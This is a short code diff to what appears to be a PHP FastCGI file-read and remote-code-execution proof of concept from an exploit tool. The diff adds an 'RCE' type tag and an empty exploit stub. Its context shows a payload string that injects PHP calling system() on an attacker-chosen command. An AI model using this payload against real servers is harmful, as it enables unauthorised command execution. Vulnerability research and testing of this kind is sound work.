@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #-*- coding:utf-8 -*-
 #author = i@cdxy.me
-
+_type = 'RCE'
 """
 PHP FastCGI Fileread/RCE PoC & Exp
 """
@@ -35,6 +35,8 @@ def poc(ip):
 
     return False
 
+def exp(ip, command):
+    pass
 
 def exp_data():
     post_data = "<?php echo('" + FLAG + "');system('" + COMMAND + "');die('" + FLAG + "');?>"
